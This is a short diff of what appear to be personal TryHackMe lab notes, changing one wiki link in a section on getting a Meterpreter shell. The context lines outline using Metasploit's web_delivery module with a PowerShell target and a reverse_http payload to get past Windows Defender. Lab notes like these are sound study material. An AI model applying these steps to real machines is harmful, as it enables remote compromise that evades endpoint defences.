@@ -280,7 +280,7 @@ THM{COIN_OPERATED_EXPLOITATION}
 ```
 ## getting a meterpreter shell:
 - victim's running windows defender
-- gonna use `exploit/multi/script/web_delivery`in [[metasploit]] becuase it spins up an http server and sends the payload through that. and since http traffic tends to slip through windows defender 
+- gonna use `exploit/multi/script/web_delivery`in [[metasploit_framework]] becuase it spins up an http server and sends the payload through that. and since http traffic tends to slip through windows defender 
 - gonna set the target to PSH (powershell)
 - `set payload windows/meterpreter/reverse_http`
 - got a [[meterpreter]] session
